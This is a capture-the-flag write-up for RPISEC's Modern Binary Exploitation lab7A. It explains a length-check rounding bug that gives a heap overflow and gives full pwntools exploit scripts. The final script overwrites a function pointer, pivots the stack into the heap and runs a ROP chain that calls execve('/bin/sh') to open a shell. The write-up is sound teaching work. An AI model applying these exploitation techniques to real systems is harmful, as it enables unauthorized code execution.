The challenge is from "Modern Binary Exploitation" course kindly provided by RPISEC.

The vulnerability was pretty easy to spot, but the exploitation required some level of creativity :)

Let's take a look at the source code of the challenge:

```
/* compiled with: gcc -static -z relro -z now -fstack-protector-all -o lab7A lab7A.c */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include "utils.h"

ENABLE_TIMEOUT(60)

#define MAX_MSG    10
#define MAX_BLOCKS 32
#define BLOCK_SIZE 4

struct msg {
    void (* print_msg)(struct msg *);
    unsigned int xor_pad[MAX_BLOCKS];
    unsigned int message[MAX_BLOCKS];
    unsigned int msg_len;
};

struct msg * messages[MAX_MSG];

/* apply one time pad */
void encdec_message(unsigned int * message, unsigned int * xor_pad)
{
    int i = 0;
    for(i = 0; i < MAX_BLOCKS; i++)
        message[i] ^= xor_pad[i];
}

/* print information about the given message */
void print_message(struct msg * to_print)
{
    unsigned int i = 0;
    char * xor_pad;
    char * message;

    xor_pad = (char *)&to_print->xor_pad;
    message = (char *)&to_print->message;

    /* print the message's xor pad */
    printf("\nXOR Pad: \n"
           "-----------------------------------------\n");

    for(i = 0; i < BLOCK_SIZE*MAX_BLOCKS; i++)
    {
        printf("%02x", xor_pad[i] & 0xFF);
        if(i % 32 == 31)
            puts("");
    }

    /* print encrypted message */
    printf("\nEncrypted Message: \n"
           "-----------------------------------------\n");

    for(i = 0; i < BLOCK_SIZE*MAX_BLOCKS; i++)
    {
        printf("%02x", message[i] & 0xFF);
        if(i % 32 == 31)
            puts("");
    }

    puts("");
}

/* creates a message */
int create_message()
{
    int i, j;
    struct msg * new_msg = NULL;

    /* find a free message slot */
    for(i = 0; i < MAX_MSG; i++)
        if(messages[i] == NULL)
            break;

    /* make sure we actually found an empty slot */
    if(messages[i])
    {
        printf("-No message slots left!\n");
        return 1;
    }

    printf("-Using message slot #%u\n", i);

    /* initialize new message */
    new_msg = malloc(sizeof(struct msg));
    memset(new_msg, 0, sizeof(struct msg));
    new_msg->print_msg = &print_message;

    for(j = 0; j < MAX_BLOCKS; j++)
        new_msg->xor_pad[j] = rand();

    /* get the length of data the user intends to encrypt */
    printf("-Enter data length: ");

    new_msg->msg_len = get_unum();

    if(new_msg->msg_len == 0)
    {
        printf("-Message length must be greater than zero!\n");
        free(new_msg);
        return 1;
    }

    /* make sure the message length is no bigger than the xor pad */
    if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;

    /* read in the message to encrypt with the xor pad */
    printf("-Enter data to encrypt: ");
    read(0, &new_msg->message, new_msg->msg_len);

    /* encrypt message */
    encdec_message(new_msg->message, new_msg->xor_pad);

    /* save the new message to the global list */
    messages[i] = new_msg;

    return 0;
}

int edit_message()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to destroy */
    printf("-Input message index to edit: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    printf("-Input new message to encrypt: ");

    /* clear old message, and read in a new one */
    memset(&messages[i]->message, 0, BLOCK_SIZE * MAX_BLOCKS);
    read(0, &messages[i]->message, messages[i]->msg_len);

    /* encrypt message */
    encdec_message(messages[i]->message, messages[i]->xor_pad);

    return 0;
}

/* free a secure message */
int destroy_message()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to destroy */
    printf("-Input message index to destroy: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* destroy message */
    memset(messages[i], 0, sizeof(struct msg));
    free(messages[i]);
    messages[i] = NULL;

    return 0;
}

/* print a message at a select index */
int print_index()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to print */
    printf("-Input message index to print: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* print the message of interest */
    messages[i]->print_msg(messages[i]);

    return 0;
}

/* the vulnerability is in here */
void print_menu()
{
    printf("+---------------------------------------+\n"
           "|        Doom's OTP Service v1.0        |\n"
           "+---------------------------------------+\n"
           "|------------ Services Menu ------------|\n"
           "|---------------------------------------|\n"
           "| 1. Create secure message              |\n"
           "| 2. Edit secure message                |\n"
           "| 3. Destroy secure message             |\n"
           "| 4. Print message details              |\n"
           "| 5. Quit                               |\n"
           "+---------------------------------------+\n");
}

int main()
{
    int choice = 0;
    srand(time(NULL));
    disable_buffering(stdout);

    while(1)
    {
        print_menu();

        /* get menu option */
        printf("Enter Choice: ");
        choice = get_unum();

        printf("-----------------------------------------\n");

        /* handle menu selection */
        if(choice == 1)
        {
            if(create_message())
                printf("-Failed to create message!\n");
            else
                printf("-Message created successfully!\n");
        }
        else if(choice == 2)
        {
            if(edit_message())
                printf("-Failed to edit message!\n");
            else
                printf("-Message has been successfully modified!\n");
        }
        else if(choice == 3)
        {
            if(destroy_message())
                printf("-Failed to destroy message!\n");
            else
                printf("-Message destroyed!\n");
        }
        else if(choice == 4)
        {
            if(print_index())
                printf("-Failed to print message!\n");
        }
        else if(choice == 5)
        {
            break;  // exit
        }
        else
            printf("-Invalid choice!\n");

        choice = 0;
        puts("");
    }

    printf("See you tomorrow!\n");
    return EXIT_SUCCESS;
}
```
Heap is used for storing OTP-encrypted messages. As you can see, there is no obvious memory corruption (at the first glance ;)), no UAF/double-free vulnerability as well. Let's take a look at this line of code resides in ```create_message``` function:

```
    if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;
```

By default, division operation in C (and the vast majority of other programming languages) rounds down the result. Let's take a look at the ```struct msg```:

```
struct msg {
    void (* print_msg)(struct msg *);
    unsigned int xor_pad[MAX_BLOCKS];
    unsigned int message[MAX_BLOCKS];
    unsigned int msg_len;
};
```
The struct size is 264 bytes. The binary that comes along with the source code is x86 32 bit ELF binary, so pointer size is 4 bytes.
```BLOCK_SIZE``` is 4 and ```MAX_BLOCKS``` is 32, so the ```message``` array length is 128 bytes. 128(```msg_len```) / 4(```BLOCK_SIZE```) = 32 (```MAX_BLOCK```). Looks legit? Not exactly.

The vulnerability is in the division itself which result is not sanitized properly. 
129/4 = 32, because as I already mentioned, the result is rounded down. 130 and 131 emit 'false' in if statement as well.
There is ```read(0, &new_msg->message, new_msg->msg_len);``` right after this if statement. So I can write up to 131 bytes inclusively to ```message``` array, which gives me an overflow of up to 3 bytes!
Sweet, so I can freely corrupt the first 3 bytes of ```msg_len``` struct member. 

After corrupting the chunk X ```msg_len``` value I can overflow the chunk X and overwrite the chunk X+1 data. What it can give me? Let's take a look:

Simplified heap memory layout for x86 binary (ptmalloc3 heap implementation, the standard glibc allocator):
![image](https://user-images.githubusercontent.com/45107680/95101206-8f621700-073a-11eb-89d7-e081162e5a6f.png)

Also, consider this line of code in ```print_index``` function: ```messages[i]->print_msg(messages[i]);```. Initially, the ```print_message``` function is intended to be called always via this function pointer
, but the above mentioned corruption allows to overflow the chunk and overwrite the function pointer of the next chunk in memory with arbitrary address.

Let's take a look at how instruction pointer can be controlled via the corruption. I use ```pwntools``` Python framework which simplifies 
A LOT of tasks during the exploit development. A convenient shellcoding and GDB integration are my favorite ;) 

```
from pwn import *

io = process("./lab7A")
gdb.attach(io, '''
b *create_message + 127
b *create_message + 416
b *print_index + 158
c
''')

def allocate_chunk(payload, len):
    io.recvuntil(b'Choice: ')
    io.sendline(b'1')
    io.recvuntil(b'length: ')
    io.sendline(str(len).encode()) 
    io.recvuntil(b'encrypt: ')
    io.sendline(payload) 

# first chunk allocation
# let's overflow 1 byte
first_chunk_len = 129 
# this payload results in overwriting the current chunk's msg_len to 0x42 
first_chunk_payload = b'\x41' * 128 + b'\x42' 
allocate_chunk(first_chunk_payload, first_chunk_len)
# second chunk allocation
# this chunk can be legitimate, at least for now
second_chunk_len = 1
second_chunk_payload = b'\x43'
allocate_chunk(second_chunk_payload, second_chunk_len)
io.interactive()
```

```b *create_message + 127``` - this breakpoint stops right after malloc.

```b *create_message + 416``` - this one on the return from ```create_message```

```b *print_index + 158``` - and this one on the function pointer invocation.

Let's inspect the heap before the second return from the ```create_message``` function:

![writeup1](https://user-images.githubusercontent.com/45107680/95108404-ed472c80-0743-11eb-832f-888a61958c71.png)

The marked areas are related to the first chunk, ```malloc``` has returned ```0x8a309d0```.

Yellow - ```print_msg``` function pointer 

Green - ```xorpad``` array

Light blue - OTP-encrypted ```message``` array

Red - ```msg_len```

Unmarked remained memory afterwards is the second chunk layout.

As you can see, the initial ```msg_len``` value 0x81 (129 in decimal) was successfully overwritten with 0x42, which demonstrates the ability to corrupt ```msg_len``` struct member. Now, let's see if I can control the instruction pointer. The offset from ```message``` to the next chunk function pointer is 128 (```message``` buffer size) + 4 (```msg_len```) + 8 (chunk metadata header) = 140 bytes. So let's corrupt the ```msg_len``` with 0x90 (144 in decimal). I'll send 140 garbage bytes + ```0xdeadbeef``` which will accurately overwrite the next chunk function pointer. Let's alter the script accordingly:

```
from pwn import *

io = process("./lab7A")
gdb.attach(io, '''
b *create_message + 127
b *print_index + 158
c
''')

def allocate_chunk(payload, len):
    io.recvuntil(b'Choice: ')
    io.sendline(b'1')
    io.recvuntil(b'length: ')
    io.sendline(str(len).encode()) 
    io.recvuntil(b'encrypt: ')
    io.sendline(payload) 

def print_chunk(idx):
    io.recvuntil(b'Choice: ')
    io.sendline(b'4')
    io.recvuntil(b'print: ')
    io.sendline(str(idx).encode())

def edit_chunk(new_msg, idx):
    io.recvuntil(b'Choice: ')
    io.sendline(b'2')
    io.recvuntil(b'edit: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'encrypt: ')
    io.sendline(new_msg)

# first chunk allocation
first_chunk_len = 129 
first_chunk_payload = b'\x41' * 128 + b'\x90' 
allocate_chunk(first_chunk_payload, first_chunk_len)
# second chunk allocation
second_chunk_len = 1
second_chunk_payload = b'\x43'
allocate_chunk(second_chunk_payload, second_chunk_len)
# edit the first chunk ```message``` in order to overflow to the next chunk and corrupt the function pointer of the second chunk with 0xdeadbeef
first_chunk_edited_payload = b'\x41' * 140 + p32(0xdeadbeef) 
edit_chunk(first_chunk_edited_payload, 0)
# print the second chunk in order to trigger a function call via corrupted pointer
print_chunk(1)
io.interactive()
```

It results in:

![image](https://user-images.githubusercontent.com/45107680/95111833-bfb0b200-0748-11eb-8093-3543560d5b19.png)

Boom! Segmentation fault at ```0xdeadbeef```. The instruction pointer is fully under attacker's control, which allows to hijack the execution flow and redirect the program to arbitrary address when the corrupted chunk function pointer is invoked.

Now, I need to know where to place a payload in memory, but first of all let's check the exploit mitigations applied for this binary:

![image](https://user-images.githubusercontent.com/45107680/95113498-377fdc00-074b-11eb-8355-cd5ba981e9cb.png)

There are stack canaries, but it doesn't seem to bother me too much, because stack is not that much used in this program, maybe the payload needs to be written to a heap, who knows ;) 

NX is on, which means that every virtual memory page is either writable OR executable, not writable and executable at the same time. That means that writing a shellcode to stack/heap and then jumping to it is not a viable option. I can bypass it via ROP (Return Oriented Programming). 

The binary was not compiled as PIE, good news! It means that binary image addresses are not affected by ASLR, so I can hardcode any address related to a binary image. Stack and heap addresses are affected by ASLR though, so there is no option to hardcode them. The rest of the mitigations are not relevant for this challenge, at least for my solution.

So I decided to craft a payload as a ROP chain. As you can see, I can write a lot of data to heap, but I have very low interaction with a stack, so it seems that a ROP chain must be written to a heap and a stack pointer needs to be redirected to a heap somehow in order to execute a ROP chain from well controlled memory area. I can call an arbitrary function (in fact, jump to arbitrary address pushing ```messages[i]``` to a stack right before that, according to Linux x86 calling conventions). Let's see the program state right before the crash:

![state_before_crash](https://user-images.githubusercontent.com/45107680/95119263-5e8edb80-0754-11eb-85f4-b54b841bb546.png)

Interesting, ```edx``` contains some heap address - in fact, this is ```messages[i]``` address. It would be awesome if the binary contains a ROP gadget that allows to assign the ```edx``` register value to a stack pointer in order to pivot to a heap where the main payload can be easily written. It may be ```mov esp, edx ; ret``` or ```push edx ; pop esp ; ret``` or ```pop whatever ; pop esp ; ret``` gadgets. Unfortunately, the are no such gadgets in the binary :( It looks pretty obvious that somehow I need to pivot into a heap anyway, because this is the only memory area where I can freely write a lot of arbitrary data. Let's take a look at ```print_index``` function again:

```
int print_index()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to print */
    printf("-Input message index to print: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* print the message of interest */
    messages[i]->print_msg(messages[i]);

    return 0;
}
```

There is a ```numbuf``` 32-bytes buffer, but it seems to take a valid index and return if the index is greater or equal to ```MAX_MSG```. Let's take a look at the manpage of ```strtoul```:

![strtoul](https://user-images.githubusercontent.com/45107680/95120915-f261a700-0756-11eb-893e-abf191b2ab99.png)

Hmm, interesting... It seems that I can provide a valid index and then pad the remaining buffer with arbitrary values. Let's alter the script and check it out:

```
from pwn import *

io = process("./lab7A")
gdb.attach(io, '''
b *print_index + 158
c
''')

def allocate_chunk(payload, len):
    io.recvuntil(b'Choice: ')
    io.sendline(b'1')
    io.recvuntil(b'length: ')
    io.sendline(str(len).encode()) 
    io.recvuntil(b'encrypt: ')
    io.sendline(payload) 

def print_chunk(idx, strtoul_pad = None):
    io.recvuntil(b'Choice: ')
    io.sendline(b'4')
    io.recvuntil(b'print: ')
    if strtoul_pad is None:
        io.sendline(str(idx).encode())
    else:
        io.sendline(str(idx).encode() + strtoul_pad)

def edit_chunk(new_msg, idx):
    io.recvuntil(b'Choice: ')
    io.sendline(b'2')
    io.recvuntil(b'edit: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'encrypt: ')
    io.sendline(new_msg)

# first chunk allocation
first_chunk_len = 129 
first_chunk_payload = b'\x41' * 128 + b'\x90' 
allocate_chunk(first_chunk_payload, first_chunk_len)
# second chunk allocation
second_chunk_len = 1
second_chunk_payload = b'\x43'
allocate_chunk(second_chunk_payload, second_chunk_len)
# edit the first chunk ```message``` in order to overflow to the next chunk and corrupt the function pointer of the second chunk with 0xdeadbeef
first_chunk_edited_payload = b'\x41' * 140 + p32(0xdeadbeef) 
edit_chunk(first_chunk_edited_payload, 0)
# print the second chunk in order to trigger a function call via corrupted pointer
print_chunk(1, b'\x41'*31) # send 31 A's to pad the remaining buffer and see what happens
io.interactive()
```

![strtoul_pad](https://user-images.githubusercontent.com/45107680/95122130-baf3fa00-0758-11eb-9f82-d41a150afa39.png)

Good news! I control 30 bytes in ```numbuf``` buffer passing the index validation check. Of course, it's too small space for a full payload, but it can be used to place a gadget address there that will allow me to redirect a stack pointer to a heap. So, I need a gadget like ```add esp, X ; ret``` in order to pivot to ```numbuf```. It turned out that there is a bunch of such gadgets, but I needed to save as much stack space as possible, because ```numbuf``` is not that big and I don't know yet if there are comfy gadgets to pivot easily to a heap from there. I've found a gadget that looks pretty neat to pivot into the controlled buffer on a stack - ```add esp, 0x20 ; mov eax, esi ; pop ebx ; pop esi ; ret```. Let's overwrite the second chunk function pointer with this gadget address and see the stack content during execution flow hijacking:

![check_stack_pivot](https://user-images.githubusercontent.com/45107680/95196234-79a72d00-07e0-11eb-9047-c735995edbe2.png)

Red arrow - initial ```esp``` position AFTER the pivoting into ```numbuf```
 
Green arrow - as I have 2 dummy pops from the stack pivot gadget, this memory can be used for overwriting with a gadget address that redirects a stack pointer to a heap.

Orange underline - the last 4 bytes that I control in ```numbuf``` buffer (in fact there are 3 more bytes, but it's not aligned to a stack, so there is a big chance that I won't have a gadget to use them somehow).

So, I have roughly 20 bytes for a short ROP chain that must make a stack pointer to point at the heap address which resides in ```edx``` register during execution flow hijacking. Not so bad, but are there appropriate gadgets in the binary that will assign ```edx``` value to ```esp``` somehow? After some time of tinkering, I came up with a short and, as I think, elegant gadget sequence that tricks a stack pointer to point at a heap :) Let's take a look at these gadgets that I've found:

```mov eax, edx ; ret```

```xchg eax, esp ; ret```

After pivoting into ```numbuf```, ```esp``` points at ```0xffa9d02c``` (marked with a red arrow on the previous screenshot), then there is an assignment of ```esi``` into ```eax``` (don't care), 2 pops (don't care, I'm not interested in ```ebx``` and ```esi``` register values for now, so these 7 bytes after a stack pivoting can be filled with garbage) and ret, which allows me to jump into next gadget as I still have some controlled space in ```numbuf```. So let's jump into the above mentioned ```mov eax, edx ; ret```. 

```edx``` register contains a heap address which is assigned to ```eax```. 

```xchg eax, esp ; ret``` swaps ```esp``` and ```eax``` values between these registers. Thus, ```esp``` gets the ```edx``` value through ```eax```, which effectively pivots a stack pointer to a heap! So the payload for the ```numbuf``` is 1 (chunk index where the function pointer is overwritten by stack pivoting gadget) + 7 garbage bytes (padding the "don't care" memory space with garbage) + mov_eax_edx gadget address + xchg_eax_esp gadget address. The payload size fits nicely into the ```numbuf``` space constraints, lefting 12 remaining controlled bytes unused :)

![image](https://user-images.githubusercontent.com/45107680/95199015-d0af0100-07e4-11eb-8217-210cb65fbc95.png)

Perfect! After this short ROP chain execution, ```esp``` register points at ```0x99c2ae4```, which is ```edx + 4```, and ```edx``` points at ```messages[i]``` where ```i``` is the index of the chunk with a corrupted function pointer. Now the program is tricked to treat a heap as a stack!

Pay attention, that the last gadget returned the execution flow back to the stack pivoting gadget. That's because [edx] = stack pivoting gadget address which initially overwrote the valid function pointer in the corrupted chunk. But for now it doesn't matter, because ```esp``` now points at heap that fully controlled by the attacker, unlike stack. I need to pad the odd space in heap created by the second stack pivoting gadget execution with a garbage and concatenate another ROP chain with a final payload. 

The "main" ROP chain will fill an appropriate registers and issue the software interrupt to invoke ```execve``` syscall. The rest of the ROP chain crafting was trivial, but I want to write a couple of things about ```ebx``` register that must contain a pointer to ```/bin/sh``` string needed for popping a shell. There is no ```/bin/sh``` string in the binary, so I need to write this string into the binary by myself. Fortunately, ROP is a very powerful technique that was proven to be Turing-complete (yes, you can craft a freaking entire arbitrary program inside of the other program without code injection, that's sick), so I need to find a gadget that gives me, what is called, write-what-where primitive. I can easily control ```eax``` and ```edx``` registers via ```pop eax ; ret``` and ```pop edx ; ret```, so I've picked this gadget for WWW -> ```mov dword ptr [edx], eax ; ret```. 

Remember, that binary was not compiled as PIE, so its' data section is not affected by ASLR. Data section is readable and writable, so I can pick any not used memory in data section and write ```/bin/sh``` string there via the WWW gadget. I've picked ```0x80ec704``` address because it resides in nullified memory region in data section which looks to be unused during program execution. 

That's how the main ROP chain looks in memory after redirecting a stack pointer to a heap:

![main_chain_layout](https://user-images.githubusercontent.com/45107680/95231835-598d6300-080c-11eb-9181-be94719dfdcf.png)

It computationally equals to ```execve("/bin/sh", NULL, NULL)```. The ROP chain is documented in the final exploit, check it out if something is unclear. 

A moment of truth:

![image](https://user-images.githubusercontent.com/45107680/95235624-83478980-080e-11eb-9b8b-9648f30ac0df.png)

Yay, the shell is popped nicely :)

The final exploit for the local test: 

```
from pwn import *
import sys

def build_heap_rop_chain(main_gadgets):
    heap_rop_chain = b''
    for gadget in main_gadgets:
        heap_rop_chain += gadget
    return heap_rop_chain

def allocate_chunk(payload, len):
    io.recvuntil(b'Choice: ')
    io.sendline(b'1')
    io.recvuntil(b'length: ')
    io.sendline(str(len).encode()) 
    io.recvuntil(b'encrypt: ')
    io.sendline(payload) 

def print_chunk(idx, strtoul_pad = None):
    io.recvuntil(b'Choice: ')
    io.sendline(b'4')
    io.recvuntil(b'print: ')
    if strtoul_pad is None:
        io.sendline(str(idx).encode())
    else:
        io.sendline(str(idx).encode() + strtoul_pad)

def edit_chunk(new_msg, idx):
    io.recvuntil(b'Choice: ')
    io.sendline(b'2')
    io.recvuntil(b'edit: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'encrypt: ')
    io.sendline(new_msg)

if __name__ == "__main__":
    global io
    if (len(sys.argv) != 2):
        print("Usage : python {} <path to vulnerable program>".format(sys.argv[0]))
        sys.exit(1)
    io = process(sys.argv[1])
    #gdb.attach(io, '''
    #b *print_index + 158
    #c
    #''')

    ptr_size = 4
    msg_len = 128
    offset_to_func_ptr = 140
    offset_to_main_rop_chain = 32
    numbuf_padding = 7
    corrupted_chunk_idx = 1
    bin_sh_str_address = p32(0x80ec704)
    garbage_byte = b'\x41'

    main_gadgets = [
        # sets ecx to 0xffffffff 
        p32(0x0805ce0c), 
        # inc ecx, thus nullifying ecx register
        p32(0x080dcbc0), 
        # pop eax ; ret
        p32(0x080bd226), 
        # /bin
        p32(0x6e69622f), 
        # pop edx ; ret
        p32(0x08082cc6),  
        bin_sh_str_address, 
        # write-what-where gadget -> mov dword ptr [edx], eax ; ret
        p32(0x080a3a1d), 
        # pop eax ; ret
        p32(0x080bd226), 
        # /sh\0
        p32(0x0068732f), 
        # pop edx ; ret
        p32(0x08082cc6), 
        # /bin/sh address + 4
        p32(u32(bin_sh_str_address) + 4), 
        # WWW gadget
        p32(0x080a3a1d), 
        # pop eax ; ret
        p32(0x080bd226), 
        # execve syscall number according to x86 ABI
        p32(0xb), 
        # pop edx ; ret
        p32(0x08082cc6), 
        # edx need to be NULL
        p32(0x0), 
        # software interrupt invocation gadget
        p32(0x08048ef6), 
    ]

    main_rop_chain = build_heap_rop_chain(main_gadgets)
    # misc gadgets
    stack_pivoting_gadget = p32(0x0807e372)
    mov_eax_edx_gadget = p32(0x080671c4)
    pivot_to_heap_gadget = p32(0x0804bb6c)

    # first chunk allocation that will overflow the second
    first_chunk_len = 130
    first_chunk_payload = garbage_byte * msg_len + p32(offset_to_func_ptr + 
                                                       ptr_size + 
                                                       offset_to_main_rop_chain +
                                                       2 * ptr_size + 
                                                       ptr_size * len(main_rop_chain)) 
    allocate_chunk(first_chunk_payload, first_chunk_len)
    
    # the second chunk will carry the main ROP chain, so there is no reason to malform it like the first one
    second_chunk_len = 1
    second_chunk_payload = garbage_byte
    allocate_chunk(second_chunk_payload, second_chunk_len)
    # edit the first chunk to overflow the second in order to write a main payload into it PRIOR to execution flow hijacking
    first_chunk_edited_payload = garbage_byte * offset_to_func_ptr + stack_pivoting_gadget + garbage_byte * offset_to_main_rop_chain + bin_sh_str_address + garbage_byte * ptr_size + main_rop_chain
    edit_chunk(first_chunk_edited_payload, 0)
    # the short ROP chain in numbuf stack buffer that allows to pivot into the heap
    stack_rop_chain = garbage_byte * numbuf_padding + mov_eax_edx_gadget + pivot_to_heap_gadget;
    # trigger the arbitrary code execution via printing the second chunk which function pointer was overwritten with stack pivoting gadget address
    print_chunk(corrupted_chunk_idx, stack_rop_chain) 
    # enjoy the shell :)
    io.interactive()
```

Now let's exploit the actual RPISEC VM where the challenge and its' flag reside (change the exploit according to your host-guest VM network settings):

![image](https://user-images.githubusercontent.com/45107680/95243635-9a3fa900-0819-11eb-9caa-940454fcd316.png)

That's all :) 

By the way, I've searched for other solutions after I've solved the challenge and I've seen another solution that looks pretty interesting - a heap pointer was leaked from a stack via crafted format string and recursive call to ```print_index``` prior to ```printf``` due to stack layout constraints. Very smart and not obvious way to solve this challenge via some kind of stack grooming + info leak that is possible due to arbitrary call primitive. Also, in this solution a ROP chain was used to make a virtual memory page that belongs to a heap executable via ```mprotect``` syscall, so the main payload is a shellcode, not a ROP chain like in my solution. For all those who curious to check it out -> https://hackingiscool.pl/heap-overflow-with-stack-pivoting-format-string-leaking-first-stage-rop-ing-to-shellcode-after-making-it-executable-on-the-heap-on-a-statically-linked-binary-mbe-lab7a/
